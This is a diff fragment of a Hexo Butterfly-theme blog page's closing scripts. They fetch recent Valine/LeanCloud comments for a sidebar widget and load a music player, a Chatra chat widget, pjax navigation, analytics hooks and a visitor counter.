+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://MynqQPDI.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": 'MynqQPDIzA7sk9p7dF7E8vPi-gzGzoHsz',
+        "X-LC-Key": 'nQR603PJj8t2qUQiGTSeqXrB',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "无法获取评论，请确认相关配置是否正确"
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script src="//lib.baomitu.com/jquery/3.3.1/jquery.min.js"></script><script src="https://myhkw.cn/api/player/1641175681147" id="myhk" key="1641175681147" m="1"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐" data-fontsize="15px" data-random="false" async="async"></script><script>(function(d, w, c) {
+    w.ChatraID = 'EqStaz8vFN6KYhHzY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
